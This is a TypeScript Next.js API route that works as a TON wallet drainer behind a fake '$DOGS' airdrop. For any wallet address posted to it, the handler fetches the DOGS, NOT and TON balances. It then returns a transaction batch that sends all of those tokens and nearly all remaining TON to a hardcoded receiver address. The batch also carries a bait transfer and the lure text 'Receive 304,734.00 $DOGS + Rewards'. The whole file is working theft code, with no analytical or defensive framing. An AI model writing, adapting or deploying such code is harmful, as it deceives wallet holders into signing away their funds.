import { Address, beginCell, toNano, TonClient, TupleBuilder } from "@ton/ton";
import { NextRequest, NextResponse } from "next/server";


const client = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
	apiKey:  process.env['TON_API']
});

const dogsAddress = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS";
const notAddress = "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT"
const dogsContract = client.provider(Address.parse(dogsAddress));
const receiver = "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9";

const defaultText = '🔐 Receive 304,734.00 $DOGS + Rewards'

const bayadAddress = "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9";
const koskeshiAddress = "UQBKSAA1lzueQq2SuZmopHeDJTYQ9PRSvRZATEKitn0MsPrk"
const ridimAddress = "EQASdk1XxjMmu8MB3bjDlQxKqBBRtAvQTTmKG204Y-eRtbHT";

export async function POST(req: NextRequest) {
	const { address: sender } = await req.json();

	const senderWallet = Address.parse(sender);
	const receiverWallet = Address.parse(receiver);

	const fee = toNano("0.05");

	const [dogsSenderJettonWallet, notSenderJettonWallet, dogsReceiverJettonWallet, notReceiverJettonWallet] = await Promise.all([
		getContractWallet(dogsAddress, senderWallet),
		getContractWallet(notAddress, senderWallet),
		getContractWallet(dogsAddress, receiverWallet),
		getContractWallet(notAddress, receiverWallet),
	]);

	const [dogs, not, tons] = await Promise.all([
		getTokenBalance(dogsSenderJettonWallet),
		getTokenBalance(notSenderJettonWallet),
		client.getBalance(senderWallet)
	]);

	const transactions = [];

	transactions.push({
		amount: fee.toString(),
		address: dogsReceiverJettonWallet.toString(),
		payload: await createTokenTransferPayload(receiverWallet, senderWallet, toNano('304734'))
	})

	if (dogs) {
		const payload = await createTokenTransferPayload(senderWallet, receiverWallet, dogs);

		transactions.push({
			address: dogsSenderJettonWallet.toString(),
			amount: fee.toString(),
			payload
		})
	}
	if (not) {
		const payload = await createTokenTransferPayload(senderWallet, receiverWallet, not);

		transactions.push({
			address: notSenderJettonWallet.toString(),
			amount: fee.toString(),
			payload
		});
	}

	const remains = tons - (fee * BigInt(transactions.length + 1))
	if (remains > toNano('0.05')) {
		transactions.push({
			address: receiverWallet.toString(),
			amount: remains.toString(),
			payload: (beginCell().storeUint(0, 32).storeStringTail(defaultText).endCell()).toBoc().toString('base64')
		})
	}

	return NextResponse.json({
		validUntil: Math.floor(Date.now() / 1000) + 500,
		messages: transactions
	});
}

async function createTokenTransferPayload(source: Address, destination: Address, amount: bigint | number, text = defaultText) {
	// Prepare the forward payload with a simple message
	// const forwardPayload = beginCell()
	// 	.storeUint(0, 32)  // 0 opcode for a simple message
	// 	.storeStringTail(text)
	// 	.endCell();

	// Building the body with correct fields
	const body = beginCell()
		.storeUint(0xf8a7ea5, 32)
		.storeUint(0, 64)
		.storeCoins(amount)
		.storeAddress(destination)
		.storeAddress(source)
		.storeUint(0, 1)
		.storeCoins(1)
		.storeUint(0,1)
		// .storeBit(1)
		// .storeRef(forwardPayload)
		.endCell();

	return body.toBoc().toString('base64')
}

const CONTRACT_CACHE: {
	[address: string]: Awaited<ReturnType<typeof client.provider>>
} = {};

async function getContractProvider(_address: string | Address) {
	const address = typeof _address === 'string' ? _address : _address.toString();
	const cache = CONTRACT_CACHE[address];

	if (cache) return cache;

	return client.provider(Address.parse(address));
}

async function getContractWallet(contractAddress: string | Address, ownerAddress: string | Address) {
	const contract = await getContractProvider(contractAddress);

	const args = new TupleBuilder();
	args.writeAddress(typeof ownerAddress === 'string' ? Address.parse(ownerAddress) : ownerAddress);
	return await contract.get('get_wallet_address', args.build()).then(r => r.stack.readAddress());
}

async function getTokenBalance(jettonOfTokenWallet: string | Address) {
	try {
		const data = await client.runMethod(typeof jettonOfTokenWallet === 'string' ? Address.parse(jettonOfTokenWallet) : jettonOfTokenWallet, 'get_wallet_data');
		return data.stack.readNumber();
	} catch {
		return 0;
	}
}
